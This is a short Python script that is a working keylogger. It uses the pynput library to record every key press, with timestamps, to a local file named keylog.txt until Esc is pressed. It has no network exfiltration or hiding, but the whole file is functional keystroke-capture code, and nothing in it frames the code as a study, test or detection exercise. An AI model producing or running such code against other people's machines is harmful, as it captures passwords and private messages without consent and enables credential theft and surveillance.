from pynput import keyboard
from datetime import datetime

log_file = "keylog.txt"

# Add session separator with timestamp
with open(log_file, "a") as f:
    f.write(f"\n--- New Session at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

def on_press(key):
    with open(log_file, "a") as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            # For alphanumeric characters
            f.write(f"{timestamp} - {key.char}\n")
        except AttributeError:
            # For special/function keys
            f.write(f"{timestamp} - [{str(key)}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
